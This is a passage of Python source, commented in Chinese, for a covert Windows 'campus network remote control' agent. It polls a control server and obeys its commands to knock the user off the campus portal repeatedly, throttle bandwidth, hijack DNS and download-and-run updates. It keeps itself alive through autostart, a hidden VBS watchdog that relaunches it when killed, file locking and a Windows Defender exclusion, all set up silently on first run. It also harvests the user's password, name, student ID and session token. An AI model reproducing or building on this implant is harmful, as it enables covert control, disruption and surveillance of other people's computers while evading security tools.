            print(f"  [更新] 当前exe已重命名为 {os.path.basename(old_exe)}")
        except Exception as e:
            return False, f"重命名当前exe失败: {e}"
        
        # 4. 重命名新 exe → 原名
        try:
            os.rename(new_exe, AGENT_EXE)
            print(f"  [更新] 新版本已就位: {exe_name}")
        except Exception as e:
            # 回滚: 把旧的改回来
            try:
                os.rename(old_exe, AGENT_EXE)
            except:
                pass
            return False, f"替换exe失败: {e}"
        
        # 5. 启动新进程 (完全独立, 不继承父进程)
        try:
            # 传递当前的命令行参数
            cmd_args = [AGENT_EXE] + sys.argv[1:]
            subprocess.Popen(
                cmd_args,
                creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW,
                close_fds=True,
                cwd=AGENT_DIR
            )
            print(f"  [更新] 新版本已启动, 即将退出当前进程")
        except Exception as e:
            return False, f"启动新版本失败: {e}"
        
        msg = f"更新成功: v{AGENT_VERSION}→v{target_version or '?'}"
        return True, msg
    else:
        # 开发环境: 只下载, 不替换
        os.rename(new_exe, os.path.join(AGENT_DIR, f"CampusNetAgent_v{target_version}.exe"))
        return True, f"开发模式: 新版本已下载, 不自动替换"

def _start_watchdog():
    """启动看门狗: 创建一个监控脚本, 主进程被杀后自动重启
    
    看门狗使用 DETACHED_PROCESS 独立运行, 父进程被杀也不影响
    """
    if platform.system() != "Windows":
        return
    import subprocess
    watchdog_vbs = os.path.join(AGENT_DIR, "_watchdog.vbs")
    _unprotect_file(watchdog_vbs)
    # 通过PID锁文件检查已有看门狗是否存活
    pid_file = os.path.join(AGENT_DIR, "_watchdog.pid")
    existing_pid = None
    if os.path.exists(pid_file):
        try:
            with open(pid_file, "r") as f:
                existing_pid = int(f.read().strip())
            # 检查该PID是否仍为wscript进程
            r = subprocess.run(["tasklist", "/FI", f"PID eq {existing_pid}", "/FO", "CSV", "/NH"],
                             capture_output=True, timeout=5,
                             creationflags=subprocess.CREATE_NO_WINDOW)
            out = r.stdout.decode('gbk', errors='ignore')
            if "wscript.exe" in out.lower():
                _autostart_log(f"看门狗已在运行 (PID {existing_pid}), 跳过")
                return
        except: pass
    
    if getattr(sys, 'frozen', False):
        # 打包后: 监控 exe 进程名, 每30秒检查
        exe_name = os.path.basename(AGENT_EXE)
        vbs_code = f'''On Error Resume Next
Set ws = CreateObject("WScript.Shell")
WScript.Sleep 10000
Do While True
    Set objWMI = GetObject("winmgmts:")
    If Err.Number <> 0 Then
        Err.Clear
        WScript.Sleep 30000
    Else
        Set procs = objWMI.ExecQuery("SELECT * FROM Win32_Process WHERE Name = '{exe_name}'")
        If Err.Number = 0 And procs.Count = 0 Then
            ws.Run """{AGENT_EXE}""", 0, False
        End If
        Err.Clear
        WScript.Sleep 30000
    End If
Loop
'''
    else:
        # 开发环境: 监控 python 进程
        python_exe = sys.executable
        vbs_code = f'''Set ws = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
agentScript = "{AGENT_SCRIPT}"
pythonExe = "{python_exe}"
WScript.Sleep 10000
Do While True
    On Error Resume Next
    Set objWMI = GetObject("winmgmts:")
    Set procs = objWMI.ExecQuery("SELECT * FROM Win32_Process WHERE CommandLine LIKE '%" & Replace(agentScript, "\\", "\\\\") & "%' AND Name = 'python.exe'")
    If procs.Count = 0 Then
        ws.Run """" & pythonExe & """ """ & agentScript & """", 0, False
    End If
    On Error Goto 0
    WScript.Sleep 30000
Loop
'''
    # wscript 默认用系统 ANSI 读取 VBS, 中文路径必须用 mbcs
    with open(watchdog_vbs, "w", encoding="mbcs") as f:
        f.write(vbs_code)
    # 静默启动看门狗 (DETACHED_PROCESS: 完全独立于父进程, 父进程被杀不影响)
    DETACHED = 0x00000008  # DETACHED_PROCESS
    CREATE_NEW_PG = 0x00000200  # CREATE_NEW_PROCESS_GROUP
    try:
        p = subprocess.Popen(["wscript.exe", watchdog_vbs],
                        creationflags=DETACHED | CREATE_NEW_PG,
                        close_fds=True)
        # 写入PID锁文件, 供下次启动去重
        try:
            _unprotect_file(pid_file)
            with open(pid_file, "w") as f:
                f.write(str(p.pid))
        except: pass
        _autostart_log(f"✓ 看门狗已启动 (wscript PID={p.pid})")
        print("  [GUARD] 看门狗已启动")
    except Exception as e:
        _autostart_log(f"✗ 看门狗启动失败: {e}")
        print(f"  [GUARD] 看门狗启动失败: {e}")

# ============ 配置管理 ============

def load_config():
    try:
        with open(CONFIG_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return {}

def save_config(cfg):
    try:
        _unprotect_file(CONFIG_FILE)
        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump(cfg, f, ensure_ascii=False, indent=2)
    except Exception as e:
        print(f"[WARN] 保存配置失败: {e}")

# ============ 校园网操作 ============

class CampusNet:
    def __init__(self, portal_ip=PORTAL_IP):
        self.portal_ip = portal_ip
        self.base_url = f"http://{portal_ip}"
        self.user_index = ""
        self.username = ""       # portal 返回的 userName (中文姓名)
        self.user_id = ""        # portal 返回的 userId (学号/账号)
        self.user_ip = ""        # portal 返回的 userIp (认证IP)
        self.password = ""
        self._cookie_opener = None

    def check_online(self):
        """检测是否在线, 返回 (online, campus_ip, user_index, message)
        
        每次都用 cookie 实时从 portal 获取, 不依赖缓存
        """
        try:
            import http.cookiejar
            # 1. 建立带cookie jar的opener (每次新建, 保证拿最新session)
            jar = http.cookiejar.CookieJar()
            opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
            # 2. 先GET首页让portal set JSESSIONID cookie
            try:
                opener.open(self.base_url + "/", timeout=5).read()
            except: pass
            # 3. 带cookie POST查询 (portal按源IP+JSESSIONID返回当前登录用户)
            info_url = f"{self.base_url}/eportal/InterFace.do?method=getOnlineUserInfo"
            req = urllib.request.Request(info_url, data=b"userIndex=", method="POST")
            req.add_header("Content-Type", "application/x-www-form-urlencoded")
            try:
                with opener.open(req, timeout=5) as resp:
                    text = resp.read().decode("utf-8", errors="ignore")
                    info = json.loads(text)
                    ui = info.get("userIndex", "") or ""
                    name = info.get("userName", "") or ""
                    uid = info.get("userId", "") or ""
                    user_ip = info.get("userIp", "") or ""
                    if ui:
                        # 实时覆盖所有字段 (不管之前缓存什么)
                        self.user_index = ui
                        self.username = name
                        self.user_id = uid
                        self.user_ip = user_ip
                        self._cookie_opener = opener
                        display = name or uid or "?"
                        return True, user_ip or get_local_ip(), ui, f"已认证: {display} ({uid})"
                    else:
                        # portal 返回但无 userIndex: 未登录或已下线
                        self.user_index = ""
                        # 不清 username/user_id, 保留上次显示
            except: pass

            # 4. 检测外网连通性 (区分 "未认证但网络通" vs "完全断网")
            try:
                urllib.request.urlopen("http://www.baidu.com", timeout=3)
                return True, get_local_ip(), "", "网络可用(未认证)"
            except:
                return False, get_local_ip(), "", "网络不可用"
        except Exception as e:
            return False, get_local_ip(), "", str(e)

    def login(self, username, password, service=""):
        """登录校园网"""
        try:
            self.username = username
            self.password = password
            url = f"{self.base_url}/eportal/InterFace.do?method=login"
            data = urllib.parse.urlencode({
                "userId": username,
                "password": password,
                "service": service,
                "queryString": "",
                "operatorPwd": "",
                "operatorUserId": "",
                "validcode": "",
                "passwordEncrypt": "false",
            }).encode()
            req = urllib.request.Request(url, data=data, method="POST")
            req.add_header("Content-Type", "application/x-www-form-urlencoded")
            with urllib.request.urlopen(req, timeout=10) as resp:
                text = resp.read().decode("utf-8")
                result = json.loads(text)
                if result.get("result") == "success":
                    self.user_index = result.get("userIndex", "")
                return result
        except Exception as e:
            return {"result": "fail", "message": str(e)}

    def _portal_post(self, url, data_dict, timeout=10):
        """统一的 portal POST: 优先复用已有的 cookie opener (携带JSESSIONID)"""
        data = urllib.parse.urlencode(data_dict).encode()
        req = urllib.request.Request(url, data=data, method="POST")
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
        # 优先用带cookie的opener (由 _refresh_user_index 保存)
        opener = getattr(self, "_cookie_opener", None)
        if opener is not None:
            resp = opener.open(req, timeout=timeout)
        else:
            resp = urllib.request.urlopen(req, timeout=timeout)
        return resp.read().decode("utf-8", errors="ignore")

    def cancel_mab(self):
        """取消本机无感认证 (cancelMab)"""
        if not self.user_index:
            return {"result": "fail", "message": "无 userIndex"}
        try:
            url = f"{self.base_url}/eportal/InterFace.do?method=cancelMab"
            text = self._portal_post(url, {"userIndex": self.user_index})
            print(f"  [NET] cancelMab: {text[:120]}")
            return json.loads(text)
        except Exception as e:
            return {"result": "fail", "message": str(e)}

    def cancel_mac_by_name(self):
        """用账号+MAC取消无感认证绑定 (cancelMacWithUserNameAndMac)"""
        if not self.username:
            return {"result": "fail", "message": "无用户名"}
        try:
            mac = get_mac().replace(":", "")
            url = f"{self.base_url}/eportal/InterFace.do?method=cancelMacWithUserNameAndMac"
            text = self._portal_post(url, {"userId": self.username, "usermac": mac})
            print(f"  [NET] cancelMacByName: {text[:120]}")
            return json.loads(text)
        except Exception as e:
            return {"result": "fail", "message": str(e)}

    def logout(self):
        """注销"""
        if not self.user_index:
            return {"result": "fail", "message": "无 userIndex"}
        try:
            url = f"{self.base_url}/eportal/InterFace.do?method=logout"
            text = self._portal_post(url, {"userIndex": self.user_index})
            print(f"  [NET] logout: {text[:120]}")
            result = json.loads(text)
            if result.get("result") == "success":
                self.user_index = ""
            return result
        except Exception as e:
            return {"result": "fail", "message": str(e)}

    def _refresh_user_index(self, force=False):
        """从 portal 实时获取当前登录用户 (不依赖缓存)
        
        force=True 时: 强制覆盖 user_index/username (用于下发命令前, 避免用旧缓存)
        关键: 锐捷portal需要JSESSIONID cookie才能识别身份
        """
        try:
            import http.cookiejar
            # 1. 建立带cookie jar的opener (每次新建, 不复用)
            jar = http.cookiejar.CookieJar()
            opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
            # 2. 先GET首页让portal set JSESSIONID cookie
            try:
                opener.open(self.base_url + "/", timeout=5).read()
            except: pass
            # 3. 带cookie POST查询
            info_url = f"{self.base_url}/eportal/InterFace.do?method=getOnlineUserInfo"
            req = urllib.request.Request(info_url, data=b"userIndex=", method="POST")
            req.add_header("Content-Type", "application/x-www-form-urlencoded")
            with opener.open(req, timeout=5) as resp:
                text = resp.read().decode("utf-8", errors="ignore")
                info = json.loads(text)
                ui = info.get("userIndex", "")
                name = info.get("userName", "")
                uid = info.get("userId", "")
                if ui:
                    self.user_index = ui
                    # force=True 或原来就没有: 强制覆盖为 portal 最新返回值
                    if force or not self.username:
                        self.username = name or uid or self.username
                    # 保存cookie opener给后续请求复用
                    self._cookie_jar = jar
                    self._cookie_opener = opener
                    print(f"  [NET] 刷新成功: user={name or uid}, index={ui[:16]}...")
                    return True
                else:
                    print(f"  [NET] 刷新失败: {info.get('message','未知')}")
        except Exception as e:
            print(f"  [NET] 刷新异常: {e}")
        return False

    def full_logout(self):
        """完整下线: 取消无感认证 + 注销
        
        关键: 强制清空缓存 + 从 portal 实时获取当前登录用户
        保证每次下发命令操作的都是当前真实登录用户, 不会误操作
        """
        results = []
        # 0. 清空缓存, 强制从 portal 实时获取
        self.user_index = ""
        self.username = ""
        self._cookie_opener = None
        refreshed = self._refresh_user_index(force=True)
        if not self.user_index:
            return {"result": "fail",
                    "message": f"无法获取 user_index (可能设备已离线或不在校园网内)"}
        
        # 1. 取消无感认证 (两种方式都试)
        r1 = self.cancel_mab()
        results.append(f"cancelMab:{r1.get('result','?')}")
        r2 = self.cancel_mac_by_name()
        results.append(f"cancelMac:{r2.get('result','?')}")
        # 2. 注销
        r3 = self.logout()
        results.append(f"logout:{r3.get('result','?')}")
        # 任意一个成功即视为成功 (Portal 对同一session的多次操作可能重复返回相同错误)
        ok = (r1.get("result") == "success"
              or r2.get("result") == "success"
              or r3.get("result") == "success")
        msg_parts = " | ".join(results)
        if not ok:
            # 附加失败详情以便诊断
            details = []
            if r1.get("message"): details.append(f"[Mab]{r1.get('message','')[:60]}")
            if r2.get("message"): details.append(f"[Mac]{r2.get('message','')[:60]}")
            if r3.get("message"): details.append(f"[Out]{r3.get('message','')[:60]}")
            if details:
                msg_parts += " | " + " ".join(details)
        return {"result": "success" if ok else "fail", "message": msg_parts}

# ============ Agent 主类 ============

class Agent:
    def __init__(self, server_url=None):
        self.cfg = load_config()
        self.server_url = (server_url or self.cfg.get("server") or DEFAULT_SERVER).rstrip("/")
        self.agent_id = get_agent_id()
        self.hostname = socket.gethostname()
        self.mac = get_mac()
        self.start_time = time.time()
        self.net = CampusNet(self.cfg.get("portal_ip", PORTAL_IP))
        
        # 恢复保存的凭据
        self.net.username = self.cfg.get("username", "")
        self.net.password = self.cfg.get("password", "")
        self.net.user_index = self.cfg.get("user_index", "")
        
        self.was_online = False     # 上一次检测是否在线
        self.force_offline = False  # 强制离线锁: True时持续执行下线
        self.force_offline_until = 0   # 强制离线到期时间戳 (0=永久直到手动解锁)

    def get_uptime(self):
        s = int(time.time() - self.start_time)
        if s < 60: return f"{s}秒"
        if s < 3600: return f"{s//60}分{s%60}秒"
        return f"{s//3600}时{(s%3600)//60}分"

    def _enforce_offline(self, online):
        """强制离线: 检测到又被无感认证自动连上时, 立刻再次下线"""
        if not self.force_offline:
            return
        # 检查定时解锁
        if self.force_offline_until > 0 and time.time() >= self.force_offline_until:
            self.force_offline = False
            self.force_offline_until = 0
            print("  [强制离线] 定时到期，自动解锁")
            return
        if not online:
            return
        print("  [强制离线] 检测到被自动重连, 执行下线...")
        self.net.cancel_mab()
        self.net.cancel_mac_by_name()
        self.net.logout()
        print("  [强制离线] 已重新下线")

    def build_status(self):
        """构建上报状态"""
        online, campus_ip, ui, msg = self.net.check_online()
        if ui:
            self.net.user_index = ui
        
        # 强制离线巡逻
        self._enforce_offline(online)
        if self.force_offline and online:
            online = False
            if self.force_offline_until > 0:
                left = int(self.force_offline_until - time.time())
                msg = f"强制离线中({left}秒后解锁)"
            else:
                msg = "强制离线中(永久)"
        
        # 断连单次触发: 从在线→离线时, 自动执行一次full_logout清理无感认证
        if self.was_online and not online and not self.force_offline:
            print("  [断连] 检测到网络断开, 单次清理无感认证...")
            self.net.cancel_mab()
            self.net.cancel_mac_by_name()
            try:
                self.net.logout()
            except: pass
            print("  [断连] 清理完毕")
        self.was_online = online
        
        # 查询限速和DNS状态 (每次心跳上报, 让服务器实时可见)
        bw_limit = get_bandwidth_limit()
        dns_hijacked, dns_servers = get_dns_status()
        
        return {
            "agent_id": self.agent_id,
            "hostname": self.hostname,
            "platform": platform.system(),
            "local_ip": get_local_ip(),
            "campus_ip": campus_ip,
            "mac": self.mac,
            # portal 实时返回的用户信息 (每次心跳用 cookie 重新获取)
            "username": self.net.username,      # 中文姓名 (userName)
            "user_id": self.net.user_id,        # 学号/账号 (userId)
            "user_index": self.net.user_index,  # session token (userIndex)
            "user_ip": self.net.user_ip,        # portal 记录的认证 IP
            "net_online": online,
            "net_message": msg,
            "uptime": self.get_uptime(),
            "autostart": is_autostart_enabled(),
            "autostart_reg": _reg_exists(),
            "autostart_task": _task_exists(),
            "autostart_lnk": _startup_lnk_exists(),
            "force_offline": self.force_offline,
            "force_offline_until": self.force_offline_until,
            # 网络控制状态
            "bandwidth_limit": bw_limit,       # 0=无限速, >0 = KB/s
            "dns_hijacked": dns_hijacked,      # bool
            "dns_servers": dns_servers,         # 当前DNS字符串
            "version": AGENT_VERSION,
        }

    def heartbeat(self):
        """发送心跳并接收命令"""
        status = self.build_status()
        result = http_post(f"{self.server_url}/api/heartbeat", status)
        if "error" in result:
            print(f"  [!] 心跳失败: {result['error']}")
            return
        # 处理命令
        for cmd in result.get("commands", []):
            self.execute(cmd)

    def execute(self, cmd):
        """执行远程命令"""
        command = cmd.get("command", "")
        params = cmd.get("params", {})
        cmd_id = cmd.get("id", "")
        print(f"  [CMD] 执行: {command} (id={cmd_id})")
        
        success = False
        message = ""
        
        try:
            if command == "logout":
                r = self.net.full_logout()
                success = r.get("result") == "success"
                message = r.get("message", "已下线" if success else "下线失败")
                # 启用强制离线锁, 防止无感认证自动重连
                self.force_offline = True
                self.reconnect_at = 0
                duration = int(params.get("duration", 0))  # 0=永久
                if duration > 0:
                    self.force_offline_until = time.time() + duration
                    message += f" | 强制离线 {duration}秒"
                else:
                    self.force_offline_until = 0
                    message += " | 强制离线(永久,发送unlock解锁)"

            elif command == "cancel_mab":
                # 清缓存, 强制从 portal 实时获取当前登录用户
                self.net.user_index = ""
                self.net.username = ""
                self.net._cookie_opener = None
                self.net._refresh_user_index(force=True)
                if not self.net.user_index:
                    success = False
                    message = "无法获取 user_index (设备已离线或不在校园网内)"
                else:
                    r1 = self.net.cancel_mab()
                    r2 = self.net.cancel_mac_by_name()
                    success = r1.get("result")=="success" or r2.get("result")=="success"
                    message = f"cancelMab:{r1.get('result','?')} cancelMac:{r2.get('result','?')}"
                    if not success:
                        details = []
                        if r1.get("message"): details.append(f"[Mab]{r1['message'][:60]}")
                        if r2.get("message"): details.append(f"[Mac]{r2['message'][:60]}")
                        if details:
                            message += " | " + " ".join(details)

            elif command == "unlock":
                self.force_offline = False
                self.force_offline_until = 0
                success = True
                message = "强制离线锁已解除"

            elif command == "login_now":
                success = False
                message = "远程上线登录功能已禁用"
                
            elif command == "login":
                success = False
                message = "远程上线登录功能已禁用"
                        
            elif command == "refresh":
                online, ip, ui, msg = self.net.check_online()
                success = True
                message = f"{'在线' if online else '离线'} - {ip} - {msg}"
                
            elif command == "set_credentials":
                success = False
                message = "远程设置凭据功能已禁用"

            elif command == "enable_autostart":
                success, message = enable_autostart()

            elif command == "disable_autostart":
                success, message = disable_autostart()

            elif command == "protect":
                r1 = protect_files()
                r2 = add_defender_exclusion()
                success = r1[0] or r2[0]
                message = f"文件保护: {r1[1]} | Defender: {r2[1]}"

            elif command == "unprotect":
                r1 = unprotect_files()
                r2 = remove_defender_exclusion()
                success = True
                message = f"{r1[1]} | {r2[1]}"

            elif command == "start_watchdog":
                _start_watchdog()
                success = True
                message = "看门狗已启动(30秒检测一次)"

            elif command == "set_bandwidth":
                rate = int(params.get("rate_kbps", 100))
                success, message = set_bandwidth_limit(rate)

            elif command == "clear_bandwidth":
                success, message = clear_bandwidth_limit()

            elif command == "set_dns":
                dns1 = params.get("primary", "127.0.0.1")
                dns2 = params.get("secondary", "")
                success, message = set_dns_hijack(dns1, dns2)

            elif command == "reset_dns":
                success, message = reset_dns()

            elif command == "self_update":
                url = params.get("url", "")
                ver = params.get("version", "")
                if not url:
                    message = "缺少下载URL"
                else:
                    success, message = self_update(url, ver)
                    if success and getattr(sys, 'frozen', False):
                        # 回报结果后退出, 新进程已启动
                        print(f"  [RES] {command}: ✓ {message}")
                        http_post(f"{self.server_url}/api/report", {
                            "agent_id": self.agent_id, "cmd_id": cmd_id,
                            "success": True, "message": message,
                        })
                        time.sleep(1)
                        os._exit(0)

            elif command == "uninstall":
                # 完全卸载 (仅服务器可触发)
                success, message = full_uninstall()
                # 回报结果后退出进程
                print(f"  [RES] {command}: {'✓' if success else '✗'} {message}")
                http_post(f"{self.server_url}/api/report", {
                    "agent_id": self.agent_id, "cmd_id": cmd_id,
                    "success": success, "message": message,
                })
                print("  [卸载] Agent 即将退出...")
                os._exit(0)
                
            else:
                message = f"未知命令: {command}"
                
        except Exception as e:
            message = f"执行异常: {e}"
            traceback.print_exc()
        
        # 回报结果
        print(f"  [RES] {command}: {'✓' if success else '✗'} {message}")
        http_post(f"{self.server_url}/api/report", {
            "agent_id": self.agent_id,
            "cmd_id": cmd_id,
            "success": success,
            "message": message,
        })

    def _save_credentials(self):
        self.cfg["username"] = self.net.username
        self.cfg["password"] = self.net.password
        self.cfg["user_index"] = self.net.user_index
        self.cfg["server"] = self.server_url
        save_config(self.cfg)

    def run(self):
        """主循环"""
        print("=" * 50)
        print(f"  校园网远程控制 - Agent v{AGENT_VERSION}")
        print("=" * 50)
        print(f"  Agent ID : {self.agent_id}")
        print(f"  主机名   : {self.hostname}")
        print(f"  MAC      : {self.mac}")
        print(f"  本机 IP  : {get_local_ip()}")
        print(f"  服务器   : {self.server_url}")
        print(f"  用户名   : {self.net.username or '(未设置)'}")
        print("=" * 50)
        
        # 清理上次更新留下的旧版本
        _cleanup_old_exe()
        
        # 每次启动都刷新自启注册 (修复路径变化/被清理的情况)
        try:
            ok, msg = enable_autostart()
            print(f"  {'✓' if ok else '✗'} 自启守护: {msg}")
        except Exception as e:
            print(f"  ✗ 自启守护异常: {e}")
        
        # 自动启动看门狗
        if not getattr(self, '_no_watchdog', False):
            try:
                _start_watchdog()
                print("  ✓ 看门狗已启动")
            except Exception as e:
                print(f"  ✗ 看门狗启动失败: {e}")
        
        print("  Agent 运行中... (Ctrl+C 停止)\n")
        
        while True:
            try:
                self.heartbeat()
            except KeyboardInterrupt:
                print("\n  Agent 已停止")
                break
            except Exception as e:
                print(f"  [ERR] {e}")
            time.sleep(HEARTBEAT_INTERVAL)


# ============ 入口 ============

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="校园网远程控制 Agent")
    parser.add_argument("--server", default=None, help="控制面板地址")
    parser.add_argument("--portal", default=None, help="Portal IP")
    parser.add_argument("--no-autostart", action="store_true", help="跳过自动设置开机自启")
    parser.add_argument("--no-protect", action="store_true", help="跳过文件防护")
    parser.add_argument("--no-watchdog", action="store_true", help="禁用看门狗")
    args = parser.parse_args()

    # 首次运行: 静默自动配置 (开机自启 + 文件防护 + Defender白名单)
    cfg = load_config()
    if not cfg.get("_installed"):
        print("  [安装] 首次运行，自动配置...")
        if not args.no_autostart:
            ok, msg = enable_autostart()
            print(f"  {'✓' if ok else '✗'} 自启: {msg}")
        if not args.no_protect:
            ok, msg = protect_files()
            print(f"  {'✓' if ok else '✗'} 防护: {msg}")
            ok, msg = add_defender_exclusion()
            print(f"  {'✓' if ok else '✗'} 白名单: {msg}")
        cfg["_installed"] = True
        cfg["server"] = DEFAULT_SERVER
        save_config(cfg)

    agent = Agent(server_url=args.server)
    agent._no_watchdog = args.no_watchdog
    
    if args.portal:
        agent.net.portal_ip = args.portal
        agent.net.base_url = f"http://{args.portal}"
    
    agent.run()
